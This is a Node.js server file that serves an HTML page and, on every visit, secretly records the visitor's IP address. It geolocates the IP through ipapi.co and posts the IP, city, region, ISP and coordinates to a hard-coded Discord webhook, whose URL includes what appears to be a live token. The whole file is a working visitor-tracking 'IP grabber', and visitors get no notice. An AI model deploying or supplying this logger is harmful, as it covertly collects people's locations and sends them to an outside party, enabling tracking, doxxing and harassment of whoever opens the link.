// lang: Node.js, file: server.js, target: any VPS/host, requires: node-fetch
// logs visitor IP + geolocation, posts to Discord webhook on each hit

const http = require('http');
const https = require('https');
const fs = require('fs');

const WEBHOOK = 'https://discord.com/api/webhooks/1565515125639618640/9cgkm3f0P1b7qZ21dY1ZLprLsFiydBFqIemIMm1yAJ76iwmyhZuavgJM2pVe8cTu34qs';
const PORT = 3000;

async function geolocate(ip) {
  return new Promise((resolve) => {
    https.get(`https://ipapi.co/${ip}/json/`, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch { resolve({}); }
      });
    }).on('error', () => resolve({}));
  });
}

async function postToDiscord(ip, geo) {
  const body = JSON.stringify({
    embeds: [{
      title: '🌐 New Visitor',
      color: 0x00bfff,
      fields: [
        { name: 'IP',      value: ip || 'unknown',              inline: true  },
        { name: 'Country', value: geo.country_name || 'unknown', inline: true  },
        { name: 'City',    value: geo.city || 'unknown',         inline: true  },
        { name: 'Region',  value: geo.region || 'unknown',       inline: true  },
        { name: 'ISP',     value: geo.org || 'unknown',          inline: false },
        { name: 'Coords',  value: `${geo.latitude}, ${geo.longitude}` || 'unknown', inline: false }
      ],
      timestamp: new Date().toISOString()
    }]
  });

  const url = new URL(WEBHOOK);
  const options = {
    hostname: url.hostname,
    path: url.pathname + url.search,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
  };

  return new Promise((resolve) => {
    const req = https.request(options, resolve);
    req.on('error', () => resolve());
    req.write(body);
    req.end();
  });
}

const server = http.createServer(async (req, res) => {
  // serve your actual HTML file
  if (req.url === '/' || req.url === '/index.html') {
    fs.readFile('./index.html', (err, data) => {
      res.writeHead(err ? 404 : 200, { 'Content-Type': 'text/html' });
      res.end(err ? 'Not found' : data);
    });
  } else {
    res.writeHead(404);
    res.end();
  }

  // grab real IP (handles proxies/cloudflare)
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

  const geo = await geolocate(ip);
  await postToDiscord(ip, geo);
});

server.listen(PORT, () => console.log(`running on :${PORT}`));
